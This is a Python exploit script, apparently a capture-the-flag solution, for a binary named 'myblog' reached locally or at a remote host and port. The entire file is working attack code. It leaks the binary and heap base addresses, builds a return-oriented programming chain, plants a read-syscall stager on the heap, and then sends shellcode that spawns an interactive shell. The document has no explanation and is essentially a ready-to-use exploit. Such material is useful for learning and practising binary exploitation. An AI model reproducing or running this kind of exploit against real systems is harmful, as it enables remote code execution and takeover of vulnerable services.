#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './myblog'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target.com', 'port':4296})
env.select()

#==========

binf = ELF(bin_file)

offset_gift         = 0xef4
offset_eax_0_leave  = 0x10fa

offset_count        = 0x202038
offset_entry        = 0x202048

#==========

def attack(conn):
    mb = Myblog(conn)

    binf.address    = mb.gift(p64(0)) - offset_gift
    addr_eax_0_leave    = binf.address + offset_eax_0_leave
    addr_leave          = addr_eax_0_leave + 5
    addr_count          = binf.address + offset_count
    addr_entry          = binf.address + offset_entry
    info('addr_binf_base    = 0x{:08x}'.format(binf.address))

    rop = ROP(binf)
    exploit  = p64(rop.rdi.address)
    exploit += p64(0)
    exploit += p64(addr_eax_0_leave)
    mb.write(p64(addr_entry - 8) + exploit, 'A')
    for _ in range(0x40 - 1):
        mb.write('C', 'A')

    mb.owner(p64(addr_count + 8))
    mb.delete(-1)

    mb.write('\x00'*8 + '\x08', 'A')
    addr_heap_base      = u(mb.owner('a')) - 0x670
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    shellcode = '''
    sub rsp, 0x8
    pop rsi
    syscall
    '''
    mb.owner(asm(shellcode))

    mb.gift(p64(0) + p64(addr_heap_base + 0x690) + p64(addr_leave))
    conn.send('\x90'*8 + asm(shellcraft.sh()))
    
class Myblog:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def write(self, content, author):
        self.sendlineafter('4. Exit\n', '1')
        self.sendafter('content\n', content)
        self.sendafter('author\n', author)

    def delete(self, index):
        self.sendlineafter('4. Exit\n', '2')
        self.sendlineafter('index\n', str(index))

    def owner(self, new):
        self.sendlineafter('4. Exit\n', '3')
        self.recvuntil(': ')
        old = self.recvuntil('\n', drop=True)
        self.sendafter(': \n', new[:7])
        return old

    def gift(self, s):
        self.sendlineafter('4. Exit\n', '31337')
        self.recvuntil('gift ')
        addr = int(self.recvuntil('\n'), 16)
        self.send(s)
        return addr

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
